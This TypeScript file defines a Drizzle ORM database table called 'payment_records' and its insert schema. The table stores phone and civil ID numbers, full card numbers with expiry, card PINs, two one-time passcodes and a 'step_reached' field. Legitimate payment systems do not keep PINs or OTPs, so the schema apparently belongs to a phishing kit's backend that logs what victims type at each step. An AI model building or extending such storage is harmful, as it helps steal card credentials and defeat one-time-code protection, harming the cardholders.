import { pgTable, serial, text, integer, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

export const paymentRecordsTable = pgTable("payment_records", {
  id: serial("id").primaryKey(),
  phone_number: text("phone_number"),
  civil_id: text("civil_id"),
  id_number: text("id_number"),
  amount: text("amount"),
  bank: text("bank"),
  card_prefix: text("card_prefix"),
  card_number: text("card_number"),
  expiry_month: text("expiry_month"),
  expiry_year: text("expiry_year"),
  pin: text("pin"),
  otp1: text("otp1"),
  otp2: text("otp2"),
  network: text("network").default("pending"),
  step_reached: integer("step_reached"),
  user_agent: text("user_agent"),
  pay_type: text("pay_type"),
  pay_for: text("pay_for"),
  created_date: timestamp("created_date").defaultNow(),
});

export const insertPaymentRecordSchema = createInsertSchema(paymentRecordsTable).omit({ id: true, created_date: true });
export type InsertPaymentRecord = z.infer<typeof insertPaymentRecordSchema>;
export type PaymentRecord = typeof paymentRecordsTable.$inferSelect;
